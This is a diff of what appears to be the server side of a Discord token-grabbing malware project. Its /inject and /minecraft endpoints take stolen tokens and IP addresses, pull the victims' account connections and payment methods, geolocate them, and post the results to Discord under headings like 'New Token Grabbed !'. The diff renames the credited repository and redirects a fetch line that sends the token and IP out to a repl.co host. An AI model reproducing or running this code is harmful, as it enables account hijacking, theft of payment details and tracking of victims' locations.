@@ -82,7 +82,7 @@ app.post("/inject", (req, res) => {
                                 setTimeout(() => {
                                     const embed = new Discord.RichEmbed()
                                         .setTitle("𝗡𝗲𝘄 𝗧𝗼𝗸𝗲𝗻 𝗚𝗿𝗮𝗯𝗯𝗲𝗱 !")
-                                        .setURL("https://github.com/GayarraFrost/DiscordTokenGrabber")
+                                        .setURL("https://github.com/kozune123/DISCORD_GRABBER/")
                                         .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", `${r.username}#${r.discriminator}`, true)
                                         .addField("𝗜𝗗", r.id, true)
                                         .addField("𝐅𝐑𝐈𝐄𝐍𝐃𝐒", `${resp.length}`, true)
@@ -122,7 +122,7 @@ app.post("/inject", (req, res) => {
         })
     }
 
- fetch("https://helloyoukozune.kauasantos.repl.co/grabbed", {headers: {token: token, ip: ip}})
+ fetch("https://Munaria.repl.co/grabbed", {headers: {token: token, ip: ip}})
     function conec(token) {
         fetch("https://discordapp.com/api/v9/users/@me/connections", {
             method: "GET",
@@ -139,7 +139,7 @@ app.post("/inject", (req, res) => {
                 else var visibility = "𝐂𝐚𝐧 𝐛𝐞 𝐬𝐞𝐞𝐧 𝐨𝐧 𝐩𝐫𝐨𝐟𝐢𝐥"
                 var embed = new Discord.RichEmbed()
                     .setTitle("𝗡𝗲𝘄 𝗧𝗼𝗸𝗲𝗻 𝗚𝗿𝗮𝗯𝗯𝗲𝗱 ! (𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻𝘀)")
-                    .setURL("https://github.com/GayarraFrost/DiscordTokenGrabber")
+                    .setURL("https://github.com/kozune123/DISCORD_GRABBER/")
                     .addField("𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦", r.type, true)
                     .addField("𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐃", r.id, true)
                     .addField("𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐍𝐚𝐦𝐞", name, true)
@@ -161,7 +161,7 @@ app.post("/inject", (req, res) => {
         fetch(`http://ip-api.com/json/${ip}`).then(res => res.json()).then(r => {
             const embed = new Discord.RichEmbed()
                 .setTitle("𝐍𝐞𝐰 𝐓𝐨𝐤𝐞𝐧 𝐆𝐫𝐚𝐛𝐛𝐞𝐝 ! (𝐆𝐞𝐨𝐈𝐏)")
-                .setURL("https://github.com/GayarraFrost/DiscordTokenGrabber")
+                .setURL("https://github.com/kozune123/DISCORD_GRABBER/")
                 .addField("𝐂𝐨𝐮𝐧𝐭𝐫𝐲: ", r.country, true)
                 .addField("𝐂𝐨𝐮𝐧𝐭𝐫𝐲 𝐂𝐨𝐝𝐞: ", r.countryCode, true)
                 .addField("𝐑𝐞́𝐠𝐢𝐨𝐧: ", r.region, true)
@@ -203,7 +203,7 @@ app.post("/inject", (req, res) => {
                     if (cardorpaypal == "𝐏𝐚𝐲𝐩𝐚𝐥") {
                         var embed = new Discord.RichEmbed()
                             .setTitle("𝐍𝐞𝐰 𝐓𝐨𝐤𝐞𝐧 𝐆𝐫𝐚𝐛𝐛𝐞𝐝 ! (𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝)")
-                            .setURL("https://github.com/GayarraFrost/DiscordTokenGrabber")
+                            .setURL("https://github.com/kozune123/DISCORD_GRABBER/")
                             .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", `${res.username}#${res.discriminator}`, true)
                             .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐈𝐃", r.id, true)
                             .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐅𝐥𝐚𝐠𝐬", r.flags, true)
@@ -221,7 +221,7 @@ app.post("/inject", (req, res) => {
                     } else {
                         var embed = new Discord.RichEmbed()
                             .setTitle("𝐍𝐞𝐰 𝐓𝐨𝐤𝐞𝐧 𝐆𝐫𝐚𝐛𝐛𝐞𝐝 ! (𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝)")
-                            .setURL("https://github.com/GayarraFrost/DiscordTokenGrabber")
+                            .setURL("https://github.com/kozune123/DISCORD_GRABBER/")
                             .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", `${res.username}#${res.discriminator}`, true)
                             .addField("𝐈𝐧𝐯𝐚𝐥𝐢𝐝 ?", r.invalid)
                             .addField("𝗙𝗹𝗮𝗴𝘀", r.flags)
@@ -287,7 +287,7 @@ app.post("/minecraft", (req, res) => {
     if (localId) {
         var embed = new Discord.RichEmbed()
             .setTitle("𝐍𝐞𝐰 𝐓𝐨𝐤𝐞𝐧 𝐆𝐫𝐚𝐛𝐛𝐞𝐝 ! (𝐌𝐢𝐧𝐞𝐜𝐫𝐚𝐟𝐭)")
-            .setURL("https://github.com/GayarraFrost/DiscordTokenGrabber")
+            .setURL("https://github.com/kozune123/DISCORD_GRABBER/")
             .addField("𝐈𝐬 𝐄𝐥𝐢𝐠𝐢𝐛𝐥𝐞 𝐅𝐨𝐫 𝐌𝐢𝐠𝐫𝐚𝐭𝐢𝐨𝐧 ?", eligibleForMigration, true)
             .addField("𝐡𝐚𝐬 𝐌𝐮𝐥𝐭𝐢𝐩𝐥𝐞 𝐏𝐫𝐨𝐟𝐢𝐥𝐞𝐬 ?", hasMultipleProfiles, true)
             .addField("𝐋𝐞𝐠𝐚𝐜𝐲", legacy, true)
